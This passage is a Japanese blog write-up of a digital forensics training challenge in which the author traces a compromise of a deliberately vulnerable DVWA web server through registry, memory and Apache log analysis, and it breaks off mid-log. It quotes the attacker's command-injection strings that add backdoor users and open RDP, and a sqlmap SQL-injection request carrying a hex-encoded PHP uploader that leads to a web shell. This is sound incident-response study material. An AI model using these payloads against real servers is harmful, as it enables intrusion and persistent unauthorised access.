<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Digital Forensic Challenge #1 - Web Server Case Write up | socketo.github.io</title>
<meta name=keywords content="Forensics"><meta name=description content="※ 移行前の元ブログ記事 : Digital Forensic Challenge #1 - Web Server Case Write up - #include <sys_socket.h>
本投稿の内容に間違いや問題などありましたら，Twitter経由などでやんわり優しめに教えて頂ければ幸いです．(Twitter:@sys_socket)
はい．
https://www.ashemery.com/dfir.html のChallenge #1
参考:
Between Two DFIRns: Ashemery.com: Challenge #1 - Web Server Case Write-up
問題文
A company’s web server has been breached through their website. Our team arrived just in time to take a forensic image of the running system and its memory for further analysis. The files can be found below:

1. System Image
2. System Memory
3. Hashes:
4. Passwords

To successfully solve this challenge, a report with answers to the tasks below is required:

1.  What type of attacks has been performed on the box?
2.  How many users has the attacker(s) added to the box, and how were they added?
3.  What leftovers (files, tools, info, etc) did the attacker(s) leave behind? (assume our team arrived in time and the attacker(s) couldn’t clean and cover their tracks)
4.  What software has been installed on the box, and were they installed by the attacker(s) or not?
5.  Using memory forensics, can you identify the type of shellcode used?
6.  What is the timeline analysis for all events that happened on the box?
7.  What is your hypothesis for the case, and what is your approach in solving it?
8.  Is there anything else you would like to add?

**Bonus Question:** what are the directories and files, that have been added by the attacker(s)? List all with proof.
**Important Note:** do not use commercial tools for your own learning benefit.
稼働していたWebサービスのシステムディスクのイメージと，システムのメモリから侵害の様子を調査する．"><meta name=author content><link rel=canonical href=https://socketo.github.io/posts/2018/02/05/><link crossorigin=anonymous href=/assets/css/stylesheet.f49d66caae9ea0fd43f21f29e71a8d3e284517ed770f2aa86fa012953ad3c9ef.css integrity="sha256-9J1myq6eoP1D8h8p5xqNPihFF+13Dyqob6ASlTrTye8=" rel="preload stylesheet" as=style><link rel=icon href=https://socketo.github.io/images/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://socketo.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://socketo.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://socketo.github.io/apple-touch-icon.png><link rel=mask-icon href=https://socketo.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://socketo.github.io/posts/2018/02/05/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://socketo.github.io/posts/2018/02/05/"><meta property="og:site_name" content="socketo.github.io"><meta property="og:title" content="Digital Forensic Challenge #1 - Web Server Case Write up"><meta property="og:description" content="※ 移行前の元ブログ記事 : Digital Forensic Challenge #1 - Web Server Case Write up - #include <sys_socket.h>
本投稿の内容に間違いや問題などありましたら，Twitter経由などでやんわり優しめに教えて頂ければ幸いです．(Twitter:@sys_socket)
はい．
https://www.ashemery.com/dfir.html のChallenge #1
参考:
Between Two DFIRns: Ashemery.com: Challenge #1 - Web Server Case Write-up
問題文 A company’s web server has been breached through their website. Our team arrived just in time to take a forensic image of the running system and its memory for further analysis. The files can be found below: 1. System Image 2. System Memory 3. Hashes: 4. Passwords To successfully solve this challenge, a report with answers to the tasks below is required: 1. What type of attacks has been performed on the box? 2. How many users has the attacker(s) added to the box, and how were they added? 3. What leftovers (files, tools, info, etc) did the attacker(s) leave behind? (assume our team arrived in time and the attacker(s) couldn’t clean and cover their tracks) 4. What software has been installed on the box, and were they installed by the attacker(s) or not? 5. Using memory forensics, can you identify the type of shellcode used? 6. What is the timeline analysis for all events that happened on the box? 7. What is your hypothesis for the case, and what is your approach in solving it? 8. Is there anything else you would like to add? **Bonus Question:** what are the directories and files, that have been added by the attacker(s)? List all with proof. **Important Note:** do not use commercial tools for your own learning benefit. 稼働していたWebサービスのシステムディスクのイメージと，システムのメモリから侵害の様子を調査する．"><meta property="og:locale" content="ja"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2018-02-05T03:21:46+00:00"><meta property="article:modified_time" content="2018-02-05T03:21:46+00:00"><meta property="article:tag" content="Forensics"><meta name=twitter:card content="summary"><meta name=twitter:title content="Digital Forensic Challenge #1 - Web Server Case Write up"><meta name=twitter:description content="※ 移行前の元ブログ記事 : Digital Forensic Challenge #1 - Web Server Case Write up - #include <sys_socket.h>
本投稿の内容に間違いや問題などありましたら，Twitter経由などでやんわり優しめに教えて頂ければ幸いです．(Twitter:@sys_socket)
はい．
https://www.ashemery.com/dfir.html のChallenge #1
参考:
Between Two DFIRns: Ashemery.com: Challenge #1 - Web Server Case Write-up
問題文
A company’s web server has been breached through their website. Our team arrived just in time to take a forensic image of the running system and its memory for further analysis. The files can be found below:

1. System Image
2. System Memory
3. Hashes:
4. Passwords

To successfully solve this challenge, a report with answers to the tasks below is required:

1.  What type of attacks has been performed on the box?
2.  How many users has the attacker(s) added to the box, and how were they added?
3.  What leftovers (files, tools, info, etc) did the attacker(s) leave behind? (assume our team arrived in time and the attacker(s) couldn’t clean and cover their tracks)
4.  What software has been installed on the box, and were they installed by the attacker(s) or not?
5.  Using memory forensics, can you identify the type of shellcode used?
6.  What is the timeline analysis for all events that happened on the box?
7.  What is your hypothesis for the case, and what is your approach in solving it?
8.  Is there anything else you would like to add?

**Bonus Question:** what are the directories and files, that have been added by the attacker(s)? List all with proof.
**Important Note:** do not use commercial tools for your own learning benefit.
稼働していたWebサービスのシステムディスクのイメージと，システムのメモリから侵害の様子を調査する．"><meta name=twitter:site content="@https://twitter.com/sys_socket"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://socketo.github.io/posts/"},{"@type":"ListItem","position":2,"name":"Digital Forensic Challenge #1 - Web Server Case Write up","item":"https://socketo.github.io/posts/2018/02/05/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Digital Forensic Challenge #1 - Web Server Case Write up","name":"Digital Forensic Challenge #1 - Web Server Case Write up","description":"※ 移行前の元ブログ記事 : Digital Forensic Challenge #1 - Web Server Case Write up - #include \u0026lt;sys_socket.h\u0026gt;\n本投稿の内容に間違いや問題などありましたら，Twitter経由などでやんわり優しめに教えて頂ければ幸いです．(Twitter:@sys_socket)\nはい．\nhttps://www.ashemery.com/dfir.html のChallenge #1\n参考:\nBetween Two DFIRns: Ashemery.com: Challenge #1 - Web Server Case Write-up\n問題文 A company’s web server has been breached through their website. Our team arrived just in time to take a forensic image of the running system and its memory for further analysis. The files can be found below: 1. System Image 2. System Memory 3. Hashes: 4. Passwords To successfully solve this challenge, a report with answers to the tasks below is required: 1. What type of attacks has been performed on the box? 2. How many users has the attacker(s) added to the box, and how were they added? 3. What leftovers (files, tools, info, etc) did the attacker(s) leave behind? (assume our team arrived in time and the attacker(s) couldn’t clean and cover their tracks) 4. What software has been installed on the box, and were they installed by the attacker(s) or not? 5. Using memory forensics, can you identify the type of shellcode used? 6. What is the timeline analysis for all events that happened on the box? 7. What is your hypothesis for the case, and what is your approach in solving it? 8. Is there anything else you would like to add? **Bonus Question:** what are the directories and files, that have been added by the attacker(s)? List all with proof. **Important Note:** do not use commercial tools for your own learning benefit. 稼働していたWebサービスのシステムディスクのイメージと，システムのメモリから侵害の様子を調査する．\n","keywords":["Forensics"],"articleBody":"※ 移行前の元ブログ記事 : Digital Forensic Challenge #1 - Web Server Case Write up - #include 本投稿の内容に間違いや問題などありましたら，Twitter経由などでやんわり優しめに教えて頂ければ幸いです．(Twitter:@sys_socket)\nはい．\nhttps://www.ashemery.com/dfir.html のChallenge #1\n参考:\nBetween Two DFIRns: Ashemery.com: Challenge #1 - Web Server Case Write-up\n問題文 A company’s web server has been breached through their website. Our team arrived just in time to take a forensic image of the running system and its memory for further analysis. The files can be found below: 1. System Image 2. System Memory 3. Hashes: 4. Passwords To successfully solve this challenge, a report with answers to the tasks below is required: 1. What type of attacks has been performed on the box? 2. How many users has the attacker(s) added to the box, and how were they added? 3. What leftovers (files, tools, info, etc) did the attacker(s) leave behind? (assume our team arrived in time and the attacker(s) couldn’t clean and cover their tracks) 4. What software has been installed on the box, and were they installed by the attacker(s) or not? 5. Using memory forensics, can you identify the type of shellcode used? 6. What is the timeline analysis for all events that happened on the box? 7. What is your hypothesis for the case, and what is your approach in solving it? 8. Is there anything else you would like to add? **Bonus Question:** what are the directories and files, that have been added by the attacker(s)? List all with proof. **Important Note:** do not use commercial tools for your own learning benefit. 稼働していたWebサービスのシステムディスクのイメージと，システムのメモリから侵害の様子を調査する．\n調査する際に以下の項目を答えなけらばならない．\nどのような攻撃が行われたか？ 追加された攻撃者のユーザ数と，そのユーザがどのように追加されたのか？ 攻撃者が残したファイル，ツール，情報 攻撃者によってインストールされたソフトウェア メモリダンプから使用したシェルコードの種類の特定 発生したインシデントのタイムライン このインシデントの仮説とそのアプローチ その他追加 調査環境・ツール FTK(R) Imager 3.2.0 : http://marketing.accessdata.com/ftkimager3.2.0\nSIFT CLI : https://github.com/sans-dfir/sift-cli\nRegRIpper : https://github.com/keydet89/RegRipper2.8 Volatility : https://github.com/volatilityfoundation/volatility USNAnalytics : https://www.kazamiya.net/usn_analytics\n有償のツールを使うなということなので，X-waysやEnCaseやその他便利有償ツールとかは使わなんという感じで．\nとりあえずダウンロードしたSystem ImageをFTK Imagerにマウントする． 出来そうなのでやる．\n調査 基本情報を調べる regripperを使用．使い方などはここに記載してあるので参考に．\nWindows Registry Forensics using ‘RegRipper’ Command-Line on Linux\n主要なレジストリハイブファイルは%SYSTEMROOT%/System32/config/にあるのでSAM,SECURITY,SOFTWARE,SYSTEMをFTKImagerでExportする\n各レジストリの説明などはここ https://support.microsoft.com/ja-jp/help/256986/windows-registry-information-for-advanced-users\nOS情報 Windowsのバージョンを確認 [socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/reg]$ rip.pl -r SOFTWARE -p winver Launching winver v.20081210 winver v.20081210 (Software) Get Windows version ProductName = Windows Server (R) 2008 Standard CSDVersion = Service Pack 1 InstallDate = Mon Aug 24 06:52:43 2015 WindowsServer(R)2008 standard SP1と判明\ntimezone timezoneの確認 [socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/reg]$ rip.pl -r SYSTEM -p timezone Launching timezone v.20160318 timezone v.20160318 (System) Get TimeZoneInformation key contents TimeZoneInformation key ControlSet001\\Control\\TimeZoneInformation LastWrite Time Mon Aug 24 07:50:29 2015 (UTC) DaylightName -\u003e @tzres.dll,-211 StandardName -\u003e @tzres.dll,-212 Bias -\u003e 480 (8 hours) ActiveTimeBias -\u003e 420 (7 hours) TimeZoneKeyName-\u003e Pacific Standard Time タイムゾーンがPacific Standard TimeでUTC -8というのを確認\nComputerName/Hostname コンピュータ名とホスト名を確認 [socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/reg]$ rip.pl -r SYSTEM -p compname Launching compname v.20090727 compname v.20090727 (System) Gets ComputerName and Hostname values from System hive ComputerName = WIN-L0ZZQ76PMUF TCP/IP Hostname = WIN-L0ZZQ76PMUF User確認 [socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/reg]$ rip.pl -r SAM -p samparse Launching samparse v.20160203 samparse v.20160203 (SAM) Parse SAM file for user \u0026 group mbrshp info User Information ------------------------- Username : Administrator [500] Full Name : User Comment : Built-in account for administering the computer/domain Account Type : Default Admin User Account Created : Mon Aug 24 06:54:25 2015 Z Name : Last Login Date : Sat Sep 12 18:19:18 2015 Z Pwd Reset Date : Mon Aug 24 06:59:37 2015 Z Pwd Fail Date : Wed Sep 2 09:00:39 2015 Z Login Count : 23 --\u003e Normal user account Username : Guest [501] Full Name : User Comment : Built-in account for guest access to the computer/domain Account Type : Default Guest Acct Account Created : Mon Aug 24 06:54:25 2015 Z Name : Last Login Date : Never Pwd Reset Date : Never Pwd Fail Date : Never Login Count : 0 --\u003e Password does not expire --\u003e Account Disabled --\u003e Password not required --\u003e Normal user account Username : user1 [1005] Full Name : User Comment : Account Type : Custom Limited Acct Account Created : Wed Sep 2 09:05:06 2015 Z Name : Last Login Date : Never Pwd Reset Date : Wed Sep 2 09:05:06 2015 Z Pwd Fail Date : Never Login Count : 0 --\u003e Normal user account Username : hacker [1006] Full Name : User Comment : Account Type : Custom Limited Acct Account Created : Wed Sep 2 09:05:25 2015 Z Name : Last Login Date : Never Pwd Reset Date : Wed Sep 2 09:05:25 2015 Z Pwd Fail Date : Never Login Count : 0 --\u003e Normal user account イメージ上では以下画像のアカウントしか残っておらず，user1 [1005], hacker [1006]は攻撃者が作った後に削除したユーザの様子．\nUSNジャーナルの解析 JSAC2018でkazamiyaさんが発表していたUSNAnalyticsを使っていきます．\n余談ですが，JSAC2018聴講しに行ったのですが「これが本当に無料でいいんかい」というくらい充実した良いカンファレンスだったので来年以降もあったら参加したいですね．\nhttps://www.kazamiya.net/usn_analytics\nUTCで出したのでこの端末のtimezoneとは−7時間違うので注意する\n調査 rootディレクトリ直下にxamppディレクトリがあるのでxamppが動いていた様子．\nメモリダンプから調べる Volatiltiyを使う． 大抵のVolatilityのコマンドはここを見れば分かるので参考．\nCommand Reference · volatilityfoundation/volatility Wiki · GitHub\n少し前にアップデートされたSANS ForensicsのMemory Forensics Cheat Sheetも参考になる．\nhttps://digital-forensics.sans.org/media/memory-forensics-cheat-sheet.pdf\nとりあえずpstreeを調べる．\nxampp-control.exeの下にhttpd.exeとFileZillaServerとmysqld.exeがぶら下がって稼働していたことが分かる(一部省略)\n[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/memory]$ vol.py -f memdump.mem --profile=Win2008SP1x86 pstree Volatility Foundation Volatility Framework 2.6 Name Pid PPid Thds Hnds Time -------------------------------------------------- ------ ------ ------ ------ ---- . 0x83faa020:xampp-control.e 2768 816 2 119 2015-08-23 10:32:17 UTC+0000 .. 0x83e4d7c0:httpd.exe 2796 2768 1 92 2015-08-23 10:32:21 UTC+0000 ... 0x83fd77a8:httpd.exe 2880 2796 155 483 2015-08-23 10:32:26 UTC+0000 .. 0x83fd5200:FileZillaServer 2856 2768 5 35 2015-08-23 10:32:25 UTC+0000 .. 0x83f9ec70:mysqld.exe 2804 2768 23 570 2015-08-23 10:32:23 UTC+0000 ポート80, 443がhttpdによって開いていたことを確認\n[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/memory]$ vol.py -f memdump.mem --profile=Win2008SP1x86 netscan | grep httpd.exe Volatility Foundation Volatility Framework 2.6 0x3efccbe8 TCPv4 0.0.0.0:80 0.0.0.0:0 LISTENING 2796 httpd.exe 0x3efccbe8 TCPv6 :::80 :::0 LISTENING 2796 httpd.exe 0x3efcde10 TCPv4 0.0.0.0:443 0.0.0.0:0 LISTENING 2796 httpd.exe 0x3efcdeb8 TCPv4 0.0.0.0:443 0.0.0.0:0 LISTENING 2796 httpd.exe 0x3efcdeb8 TCPv6 :::443 :::0 LISTENING 2796 httpd.exe 0x3efcdf60 TCPv4 0.0.0.0:80 0.0.0.0:0 LISTENING 2796 httpd.exe Apache logの確認 Apacheが動いていたようなので，イメージ上からapcheのログを確認する． [root]/xampp/apache/logs\n/dvwa/ SAMから分かった攻撃者と思われるユーザ，user11005], hacker[1006]のユーザ作成時間付近(2015/09/02 09:05:00([UTC))のaccess.logをとりあえず見る．\n※timezoneを調べた際にUTC-7というのが分かったので検索としては-7時間した\"2015/09/02 02:“を調べた [socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/apache_logs]$ cat access.log| grep 02/Sep/2015:02 192.168.56.102 - - [02/Sep/2015:02:02:33 -0700] \"POST /dvwa/vulnerabilities/exec/ HTTP/1.1\" 200 4934 \"http://192.168.56.101/dvwa/vulnerabilities/exec/\" \"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.0\" 192.168.56.102 - - [02/Sep/2015:02:03:18 -0700] \"POST /dvwa/vulnerabilities/exec/ HTTP/1.1\" 200 4934 \"http://192.168.56.101/dvwa/vulnerabilities/exec/\" \"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.0\" 192.168.56.102 - - [02/Sep/2015:02:04:36 -0700] \"POST /dvwa/vulnerabilities/exec/ HTTP/1.1\" 200 4934 \"http://192.168.56.101/dvwa/vulnerabilities/exec/\" \"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.0\" 192.168.56.102 - - [02/Sep/2015:02:05:22 -0700] \"POST /dvwa/vulnerabilities/exec/ HTTP/1.1\" 200 4971 \"http://192.168.56.101/dvwa/vulnerabilities/exec/\" \"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.2.0\" なにやら/dvwa/vulnerabilities/exec/へPOSTしていることが分かる．\ndvwaを知らなかったのでggりましたが，Damn Vulnerable Web Applicationの略称で，Webアプリケーションセキュリティの教育などに使用されるものらしいです． http://www.dvwa.co.uk/\n/dvwa/vulnerabilities/exec/はIPを入力するとそこへのPingの結果を返すというもので,以下がそのPHPのコード\nhttps://github.com/ethicalhack3r/DVWA/blob/master/vulnerabilities/exec/source/low.php\n$targetをそのまま受け取ってshell_execをしているんでIPアドレス ; cat /etc/passwdのような感じで任意のコマンドを実行可能で，このあたりでuser1の作成などをされたのではないかと推測\nDVWAの/dvwa/vulnerabilities/exec/は以下のページで解説をしている\nDamn Vulnerable Web App (DVWA): Lesson 2: Command Execution Basic Testing\n攻撃者のユーザ作成 volatilityのcmdscanプラグインを使用して攻撃者がcmd.exeから入力したコマンドを検出する．\n[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/memory]$ vol.py -f memdump.mem --profile=Win2008SP1x86 cmdscan Volatility Foundation Volatility Framework 2.6 ************************************************** CommandProcess: csrss.exe Pid: 524 CommandHistory: 0x5a24708 Application: cmd.exe Flags: Allocated, Reset CommandCount: 17 LastAdded: 16 LastDisplayed: 16 FirstCommand: 0 CommandCountMax: 50 ProcessHandle: 0x2d8 Cmd #0 @ 0xe907c8: ipconfig Cmd #1 @ 0xe91af8: cls Cmd #2 @ 0xe91db0: ipconfig Cmd #3 @ 0x5a34bd0: net user user1 user1 /add Cmd #4 @ 0x5a34eb8: net user user1 root@psut /add Cmd #5 @ 0x5a34c10: net user user1 Root@psut /add Cmd #6 @ 0x5a24800: cls Cmd #7 @ 0x5a34c58: net /? Cmd #8 @ 0x5a34d88: net localgroup /? Cmd #9 @ 0x5a34f48: net localgroup \"Remote Desktop Users\" user1 /add Cmd #10 @ 0x5a34c70: net /? Cmd #11 @ 0xe911b0: netsh /? Cmd #12 @ 0xe907e8: netsh firewall /? Cmd #13 @ 0xe91218: netsh firewall set service type = remotedesktop /? Cmd #14 @ 0xe91288: netsh firewall set service type = remotedesktop enable Cmd #15 @ 0xe91300: netsh firewall set service type=remotedesktop mode=enable Cmd #16 @ 0xe91380: netsh firewall set service type=remotedesktop mode=enable scope=subnet ************************************************** CommandProcess: csrss.exe Pid: 524 CommandHistory: 0x5a30950 Application: cmd.exe Flags: Allocated, Reset CommandCount: 2 LastAdded: 1 LastDisplayed: 1 FirstCommand: 0 CommandCountMax: 50 ProcessHandle: 0x7ec Cmd #0 @ 0xe91970: netsh fireall set service type=remotedesktop mode=enable scope=subnet Cmd #1 @ 0x5a17b58: netsh firewall set service type=remotedesktop mode=enable scope=subnet Cmd #38 @ 0x5a30bc8: Cmd #39 @ 0x5a24890: et.exe Cmd #48 @ 0x5a24890: et.exe Cmd #49 @ 0xe91af8: cls ************************************************** CommandProcess: csrss.exe Pid: 524 CommandHistory: 0x5a30ad0 Application: httpd.exe Flags: Allocated CommandCount: 0 LastAdded: -1 LastDisplayed: -1 FirstCommand: 0 CommandCountMax: 50 ProcessHandle: 0x3bc net userコマンドを使ってuser1を作成し，Remote Desktop Usersローカルグループに追加した後，Windows FireWallでRDPを有効にしていることが分かる． /dvwa/vulnerabilities/execでOSコマンドインジェクションされて作成されたのかとか想像(仮定)\nメモリイメージからStringsで見る user1がnet userコマンドを使って作成されたらしい． もう一つのアカウントhackerが作られた形跡を探す． メモリダンプからhttpd.exeのプロセス部分をダンプする\n[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/memory]$ vol.py -f memdump.mem --profile=Win2008SP1x86 pslist | grep httpd.exe Volatility Foundation Volatility Framework 2.6 0x83e4d7c0 httpd.exe 2796 2768 1 92 1 0 2015-08-23 10:32:21 UTC+0000 0x83fd77a8 httpd.exe 2880 2796 155 483 1 0 2015-08-23 10:32:26 UTC+0000 プロセスとして動いていたのはPID:2796と2880っぽい． 両方共memdumpする\n2796\n[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/memory]$ vol.py -f memdump.mem --profile=Win2008SP1x86 memdump -p 2796 -D 2796 Volatility Foundation Volatility Framework 2.6 ************************************************************************ Writing httpd.exe [ 2796] to 2796.dmp 2880\n[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/memory]$ vol.py -f memdump.mem --profile=Win2008SP1x86 memdump -p 2880 -D 2880 Volatility Foundation Volatility Framework 2.6 ************************************************************************ Writing httpd.exe [ 2880] to 2880.dmp メモリダンプから文字列を抜き出して，ユーザ名hackerで検索\n2796\n[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/memory/2796]$ strings 2796.dmp|grep hacker ~^webwhacker.*$~ WebWhacker* WebWhacker* WebWhacker Zp6.102+%26%26+net+user+hacker+hacker+/add\u0026submit=submit ip=192.168.56.102+%26%26+net+localgroup+%22Remote+Desktop+Users%22+hacker+%2Fadd\u0026submit=submit$ hackerLo 2880\n[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/memory/2880]$ strings 2880.dmp|grep hacker ~^webwhacker.*$~ WebWhacker* WebWhacker* WebWhacker Owned by hacker Owned by hacker Owned by hacker Owned by hacker Owned by hacker Zp6.102+%26%26+net+user+hacker+hacker+/add\u0026submit=submit ip=192.168.56.102+%26%26+net+localgroup+%22Remote+Desktop+Users%22+hacker+%2Fadd\u0026submit=submit$ hackerLo 両方共下2行で，net userコマンドでユーザ名hackerのユーザが作成され，Remote Desktopのローカルグループに追加されていることが分かる．\nip=192.168.56.102%26%26から始まっていることから，/dvwa/vulnerabilities/exec/のフォームからのOSコマンドインジェクションにより実行されたのでないかと推測．\nBetween Two DFIRns: Ashemery.com: Challenge #1 - Web Server Case Write-up\n参考にしたここを見たら，%26%26(URLdecodeすると\u0026\u0026)でgrepすると，[IP]+\u0026\u0026+[cmd]形式でプロセスメモリ上に残ったコマンドを検索することが出来るようで，なるほど～となった．\n[socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/memory/2880]$ strings 2880.dmp|grep %26%26 ip=192.168.56.102+%26%26+dir+C%3A%5Cwindows%5C\u0026submit=submit_ P26.102+%26%26+dir+C%3A%5Cusers%5Cadministrator\u0026submit=submit Zp6.102+%26%26+net+user+hacker+hacker+/add\u0026submit=submit ip=192.168.56.102+%26%26+dir\u0026submit=submit ip=192.168.56.102+%26%26+net+localgroup+%22Remote+Desktop+Users%22+hacker+%2Fadd\u0026submit=submit$ ip=192.168.56.102+%26%26%64%69%72\u0026submit=submit? SQLinjection access.logを見ていると，uaがsqlmapからのアクセスが大変に多い． sqlmapはSQLinjectionのテストツール http://sqlmap.org/\ntmpukudk.phpとtmpbiwuc.php [socketo@siftworkstation:/vagrant_data/ashemery/Challenge01/apache_logs]$ cat access.log|grep -e tmpukudk.php -e tmpbiwuc.php 192.168.56.102 - - [02/Sep/2015:04:25:52 -0700] \"GET /dvwa/vulnerabilities/sqli/?id=2%27%20LIMIT%200%2C1%20INTO%20OUTFILE%20%27%2Fxampp%2Fhtdocs%2Ftmpukudk.php%27%20LINES%20TERMINATED%20BY%200x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d5c5c78616d70705c5c6874646f63735c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a--%20--%20\u0026Submit=Submit HTTP/1.1\" 200 4893 \"-\" \"sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)\" 192.168.56.102 - - [02/Sep/2015:04:25:52 -0700] \"GET /xampp/htdocs/tmpukudk.php HTTP/1.1\" 403 1206 \"-\" \"sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)\" 192.168.56.102 - - [02/Sep/2015:04:25:53 -0700] \"GET /htdocs/tmpukudk.php HTTP/1.1\" 404 1059 \"-\" \"sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)\" 192.168.56.102 - - [02/Sep/2015:04:25:53 -0700] \"GET /tmpukudk.php HTTP/1.1\" 200 315 \"-\" \"sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)\" 192.168.56.102 - - [02/Sep/2015:04:25:53 -0700] \"POST /tmpukudk.php HTTP/1.1\" 200 25 \"-\" \"Python-urllib/2.7\" 192.168.56.102 - - [02/Sep/2015:04:26:04 -0700] \"GET /tmpbiwuc.php?cmd=dir HTTP/1.1\" 200 853 \"-\" \"sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)\" 192.168.56.102 - - [02/Sep/2015:04:26:23 -0700] \"GET /tmpbiwuc.php?cmd=del%20%2FF%20%2FQ%20C%3A%5Cxampp%5Chtdocs%5Ctmpukudk.php HTTP/1.1\" 200 11 \"-\" \"sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)\" 192.168.56.102 - - [02/Sep/2015:04:26:23 -0700] \"GET /tmpbiwuc.php?cmd=del%20%2FF%20%2FQ%20%5Cxampp%5Chtdocs%5Ctmpbiwuc.php HTTP/1.1\" 200 11 \"-\" \"sqlmap/1.0-dev-nongit-20150902 (http://sqlmap.org)\" URLEncodeされてて微妙に見づらいのでDecodeする． INTO OUTFILEで/xampp/htdocs/tmpukudk.phpを作成していることが分かる．\n192.168.56.102 - - [02/Sep/2015:04:25:52 -0700] \"GET /dvwa/vulnerabilities/sqli/?id=2' LIMIT 0,1 INTO OUTFILE '/xampp/htdocs/tmpukudk.php' LINES TERMINATED BY 0x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d5c5c78616d70705c5c6874646f63735c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a-- -- \u0026Submit=Submit HTTP/1.1\" 200 4893 \"-\" \"sqlmap/1.0-dev-nongit-20150902 Pythonのurllibを使って何かしらをPOST．その次に新しいtmpbiwuc.phpに対してcmd=echo command execution testとリクエストを投げているので何かしらコマンドを受けて返すスクリプトを投げている様子．WebShellとかですかね．\n192.168.56.102 - - [02/Sep/2015:04:25:53 -0700] \"POST /tmpukudk.php HTTP/1.1\" 200 25 \"-\" \"Python-urllib/2.7\" 192.168.56.102 - - [02/Sep/2015:04:25:53 